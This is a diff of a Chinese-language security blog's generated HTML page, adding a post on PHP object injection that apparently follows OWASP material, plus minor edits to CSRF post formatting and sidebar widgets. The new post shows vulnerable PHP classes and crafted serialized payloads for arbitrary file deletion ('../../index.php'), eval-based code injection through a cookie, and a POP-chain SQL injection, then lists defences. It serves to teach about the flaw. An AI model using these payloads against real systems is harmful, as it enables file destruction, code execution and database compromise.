@@ -61,6 +61,171 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-PHP-Object-Injection" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2015/11/05/PHP-Object-Injection/" class="article-date">
+  <time datetime="2015-11-05T15:48:01.000Z" itemprop="datePublished">2015-11-05</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2015/11/05/PHP-Object-Injection/">PHP Object Injection</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="描述">描述</h2><p>PHP对象注入是应用层的漏洞，能允许攻击者去执行不同种类的恶意攻击，比如代码注入，SQL注入，路径遍历和应用拒绝服务。漏洞发生在用户提供的输入在传入PHP的unserialize()函数前不被合理的过滤。自从PHP允许对象序列化，攻击者能够通过特定的序列化字符串去调用易受攻击的unserialize()，导致应用内的任意PHP对象注入。</p>
+<p>为了成功利用PHP对象注入漏洞，两个条件必须满足：</p>
+<ul>
+<li>应用必须具有一个实现了PHP魔术方法（如<strong>wakeup或</strong>destruct）的类，能够被用来进行恶意攻击，或者开始“POP链”。</li>
+<li>攻击的时候所有使用的类都必须在易受攻击的unserialize()被调用的时候声明，另外，对象自动加载一定要支持这样的类。</li>
+</ul>
+<h2 id="实例">实例</h2><h3 id="实例1">实例1</h3><p>下面的例子显示了一个有可利用的__destruct方法的PHP类：</p>
+<pre><code>class Example1
+{
+    public <span class="variable">$cache</span>_file;
+
+   function __construct()
+   {
+          // some PHP code...
+   }
+
+   function __destruct()
+   {
+          <span class="variable">$file</span> = <span class="string">"/var/www/cache/tmp/{$this-&gt;cache_file}"</span>;
+          if (file_exists(<span class="variable">$file</span>)) @unlink(<span class="variable">$file</span>);
+   }
+ }
+
+// <span class="keyword">some</span> PHP code...
+
+<span class="variable">$user</span>_data = unserialize($_GET[<span class="string">'data'</span>]);
+
+// <span class="keyword">some</span> PHP code...
+</code></pre><p>这个实例中攻击者可能能够通过路径遍历攻击删除任意文件，比如，请求如下的URL：</p>
+<pre><code>http<span class="value">://testsite.com/vuln.php?data=O:<span class="number">8</span>:<span class="string">"Example1"</span>:<span class="number">1</span>:{s:<span class="number">10</span>:<span class="string">"cache_file"</span>;</span>s<span class="value">:<span class="number">15</span>:<span class="string">"../../index.php"</span>;</span>}
+</code></pre><h3 id="实例2">实例2</h3><p>下面的例子展示了一个利用__wakeup方法的PHP类：</p>
+<pre><code>class Example2
+{
+    private <span class="variable">$hook</span>;
+
+  function __construct()
+  {
+      // some PHP code...
+   }
+
+  function __wakeup()
+  {
+      if (isset(<span class="variable">$this-</span>&gt;hook)) eval(<span class="variable">$this-</span>&gt;hook);
+   }
+}
+
+// <span class="keyword">some</span> PHP code...
+
+<span class="variable">$user</span>_data = unserialize($_COOKIE[<span class="string">'data'</span>]);
+
+// <span class="keyword">some</span> PHP code...
+</code></pre><p>这个例子中攻击者可能能够通过发送像这样的HTTP请求执行代码注入：</p>
+<pre><code>GET /vuln.php HTTP/<span class="number">1.0</span>
+Host: testsite.com
+Cookie: data=O%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>Example2%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A14%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Example2%<span class="number">00</span>hook%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>phpinfo%<span class="number">28</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D
+Connection: close
+</code></pre><p>cookie里面的参数data是由下面的脚本生成的：</p>
+<pre><code><span class="class"><span class="keyword">class</span> <span class="title">Example2</span>
+</span>{
+    <span class="keyword">private</span> <span class="variable">$hook</span> = <span class="string">"phpinfo();"</span>;
+}
+
+<span class="keyword">print</span> urlencode(serialize(<span class="keyword">new</span> Example2));
+</code></pre><h3 id="实例3">实例3</h3><p>最后的实例是展示使用“POP链”执行SQL注入攻击，例如如下使用__toString方法：</p>
+<pre><code>class Example3
+{
+    protected <span class="variable">$obj</span>;
+
+   function __construct()
+   {
+      // some PHP code...
+   }
+
+   function __toString()
+   {
+      if (isset(<span class="variable">$this-</span>&gt;obj)) return <span class="variable">$this-</span>&gt;obj-&gt;getValue();
+   }
+}
+
+// <span class="keyword">some</span> PHP code...
+
+<span class="variable">$user</span>_data = unserialize($_POST[<span class="string">'data'</span>]);
+
+// <span class="keyword">some</span> PHP code...
+</code></pre><p>如果<strong>$user_data</strong>变量是实例3对象并且在代码的某处将会被当做字符串，然后它的<strong>toString方法将被调用。因为这个方法调用存储在“obj”属性里的getValue方法，如果是有权限的，它有可能设置任意对象的属性，并且执行他的getValue方法，否则如果被定义了的话，它的</strong>call方法将会被调用。为了更容易，仅仅考虑当unserialize()被调用。下面的类在应用程序中可用（或者支持自动加载）：</p>
+<pre><code>class SQL_Row_Value
+{
+    private $_table;
+
+   // some PHP code...
+
+   function getValue(<span class="variable">$id</span>)
+   {
+      <span class="variable">$sql</span> = <span class="string">"SELECT * FROM {$this-&gt;_table} WHERE id = "</span> . (int)<span class="variable">$id</span>;
+      <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>, <span class="variable">$DBFactory</span>::getConnection());
+      <span class="variable">$row</span> = mysql_fetch_assoc(<span class="variable">$result</span>);
+
+      return <span class="variable">$row</span>[<span class="string">'value'</span>];
+   }
+}
+</code></pre><p>在这个例子中，攻击者可能能够通过发送一个包含由脚本生成的“data”参数的POST请求执行SQL注入攻击：</p>
+<pre><code><span class="class"><span class="keyword">class</span> <span class="title">SQL_Row_Value</span>
+</span>{
+   <span class="keyword">private</span> <span class="variable">$_table</span> = <span class="string">"SQL Injection"</span>;
+}
+
+<span class="class"><span class="keyword">class</span> <span class="title">Example3</span>
+</span>{
+   <span class="keyword">protected</span> <span class="variable">$obj</span>;
+
+   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span>
+   </span>{
+      <span class="variable">$this</span>-&gt;obj = <span class="keyword">new</span> SQL_Row_Value;
+   }
+}
+
+<span class="keyword">print</span> urlencode(serialize(<span class="keyword">new</span> Example3));
+</code></pre><h2 id="相关控件">相关控件</h2><ul>
+<li>输入校验</li>
+<li>静态代码分析</li>
+</ul>
+<h2 id="防御">防御</h2><p>对用户提供的输入不要使用unserialize()函数，而是使用JSON方法</p>
+<h2 id="参考">参考</h2><ul>
+<li><a href="http://php.net/manual/en/function.unserialize.php" target="_blank" rel="external">PHP: unserialize</a></li>
+<li><a href="http://php.net/manual/en/language.oop5.magic.php" target="_blank" rel="external">PHP: Magic Methods</a></li>
+<li><a href="http://php.net/manual/en/language.oop5.autoload.php" target="_blank" rel="external">PHP: Autoloading Classes</a></li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2015/11/05/PHP-Object-Injection/" data-id="cigmervmq0007m4qw4kg9i5qm" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/">PHP</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-Cross-site-Request-Forgery" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2015/11/04/Cross-site-Request-Forgery/" class="article-date">
@@ -100,17 +265,9 @@
 <p>有时候在易受攻击的网站他自己也可能存储CSRF攻击，这类漏洞被称作<strong>存储CSRF漏洞</strong>。这能通过在某点简单的存储IMG或者IFRAME标签，或者通过更复杂的跨站脚本攻击完成。如果攻击能够在网站存储CSRF攻击，那么攻击的严重性就被放大了。特别的，可能性增加是由于相比互联网上一些随机的页面，受害者更可能看到包含攻击的页面。同样由于受害者一定是已经认证过网站了的所以可能性同样增加了。</p>
 <h3 id="同义词">同义词</h3><p>CSRF攻击也被称作很多其他名字，包括XSRF，Sea Surf，Session Riding，Cross-Site Reference Forgery，和Hostile Linking。微软在他们的威胁模型程序中把这类攻击作为One-Click攻击，并且在他们的在线文档中多处提到。</p>
 <h3 id="不起作用的防御措施">不起作用的防御措施</h3><p>使用加密cookie</p>
-<pre><code>记住所有的cookie,甚至加密的那个，将在每次请求的时候被提交。
-不管最终用户是否是被诱骗提交的请求，所有认证令牌将被提交。
-此外，会话标识被应用程序容器简单的使用来关联特定会话对象。
-这些会话标识不会去证实终端用户打算提交的请求。
+<pre><code>记住所有的cookie,甚至加密的那个，将在每次请求的时候被提交。不管最终用户是否是被诱骗提交的请求，所有认证令牌将被提交。此外，会话标识被应用程序容器简单的使用来关联特定会话对象。这些会话标识不会去证实终端用户打算提交的请求。
 </code></pre><p>仅仅接收POST请求</p>
-<pre><code>应用程序能够被开发成仅仅接收执行业务逻辑的<span class="keyword">POST</span>请求。
-一个错觉是因为攻击者无法构造恶意的<span class="keyword">POST</span>请求，所以CSRF攻击就不
-能被执行。不幸的，这个逻辑是不正确的。这里有大量方法让攻击者能
-诱骗受害者去提交一个伪造请求，就像简单的从攻击者主机的网站隐藏
-所有域。这个表格将会javascript被自动的触发或者被那些认为表格
-没影响的受害者触发。
+<pre><code>应用程序能够被开发成仅仅接收执行业务逻辑的<span class="keyword">POST</span>请求。一个错觉是因为攻击者无法构造恶意的<span class="keyword">POST</span>请求，所以CSRF攻击就不能被执行。不幸的，这个逻辑是不正确的。这里有大量方法让攻击者能诱骗受害者去提交一个伪造请求，就像简单的从攻击者主机的网站隐藏所有域。这个表格将会javascript被自动的触发或者被那些认为表格没影响的受害者触发。
 </code></pre><h2 id="实例">实例</h2><h3 id="攻击如何工作的">攻击如何工作的</h3><p>有多种让终端用户被诱骗载入或提交信息到web应用程序的方式。为了执行攻击，我们必须理解如何生成可用的恶意代码请求让我们的受害者执行。让我们考虑如下例子：Alice希望通过bank.com的易受CSRF攻击的web程序转100美元给Bob。一个叫Maria的攻击者，想诱骗Alic把转转到他这里。攻击由厦门步骤组成：</p>
 <pre><code><span class="number">1.</span> 创建漏洞利用URL或脚本
 <span class="number">2.</span> 通过社会工程学引诱Alice去执行这个动作
@@ -173,7 +330,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2015/11/04/Cross-site-Request-Forgery/" data-id="cigkxiljq000ah0qw4ry17tig" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2015/11/04/Cross-site-Request-Forgery/" data-id="cigmervmy000dm4qwtm7nb4qs" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CSRF/">CSRF</a></li></ul>
@@ -272,7 +429,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2015/11/02/Blind-SQL-Injection/" data-id="cigkxili30000h0qwv6m9bt6e" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2015/11/02/Blind-SQL-Injection/" data-id="cigmervm80000m4qwl0ldsr3s" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Blind-SQL-Injection/">Blind SQL Injection</a></li></ul>
@@ -425,7 +582,7 @@ Employee Name: </span><span class="vbscript">&lt;%= name %&gt;</span><span class
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2015/11/01/Cross-site-Scripting/" data-id="cigkxiljm0007h0qwcvp0wvyf" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2015/11/01/Cross-site-Scripting/" data-id="cigmervmv000am4qw1488di1g" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS/">XSS</a></li></ul>
@@ -596,7 +753,7 @@ WHERE <span class="built_in">owner</span> =
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2015/10/25/SQL-injection/" data-id="cigkxilji0004h0qwylt3a7fy" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2015/10/25/SQL-injection/" data-id="cigmervml0004m4qwy9u6l2t4" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql-injection/">sql injection</a></li></ul>
@@ -643,7 +800,7 @@ WHERE <span class="built_in">owner</span> =
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2015/10/25/hello-world/" data-id="cigkxiljf0003h0qwj5b4s1y7" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2015/10/25/hello-world/" data-id="cigmervmi0003m4qw6i5sqtfb" class="article-share-link">Share</a>
       
       
     </footer>
@@ -664,7 +821,7 @@ WHERE <span class="built_in">owner</span> =
   <div class="widget-wrap">
     <h3 class="widget-title">Tags</h3>
     <div class="widget">
-      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Blind-SQL-Injection/">Blind SQL Injection</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSRF/">CSRF</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/">XSS</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql-injection/">sql injection</a><span class="tag-list-count">1</span></li></ul>
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Blind-SQL-Injection/">Blind SQL Injection</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSRF/">CSRF</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/">PHP</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/">XSS</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql-injection/">sql injection</a><span class="tag-list-count">1</span></li></ul>
     </div>
   </div>
 
@@ -673,7 +830,7 @@ WHERE <span class="built_in">owner</span> =
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/Blind-SQL-Injection/" style="font-size: 10px;">Blind SQL Injection</a> <a href="/tags/CSRF/" style="font-size: 10px;">CSRF</a> <a href="/tags/XSS/" style="font-size: 10px;">XSS</a> <a href="/tags/sql-injection/" style="font-size: 10px;">sql injection</a>
+      <a href="/tags/Blind-SQL-Injection/" style="font-size: 10px;">Blind SQL Injection</a> <a href="/tags/CSRF/" style="font-size: 10px;">CSRF</a> <a href="/tags/PHP/" style="font-size: 10px;">PHP</a> <a href="/tags/XSS/" style="font-size: 10px;">XSS</a> <a href="/tags/sql-injection/" style="font-size: 10px;">sql injection</a>
     </div>
   </div>
 
@@ -682,7 +839,7 @@ WHERE <span class="built_in">owner</span> =
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">October 2015</a><span class="archive-list-count">2</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">October 2015</a><span class="archive-list-count">2</span></li></ul>
     </div>
   </div>
 
@@ -692,6 +849,10 @@ WHERE <span class="built_in">owner</span> =
     <h3 class="widget-title">Recents</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2015/11/05/PHP-Object-Injection/">PHP Object Injection</a>
+          </li>
         
           <li>
             <a href="/2015/11/04/Cross-site-Request-Forgery/">Cross-site Request Forgery</a>
@@ -707,10 +868,6 @@ WHERE <span class="built_in">owner</span> =
         
           <li>
             <a href="/2015/10/25/SQL-injection/">SQL injection</a>
-          </li>
-        
-          <li>
-            <a href="/2015/10/25/hello-world/">Hello World</a>
           </li>
         
       </ul>
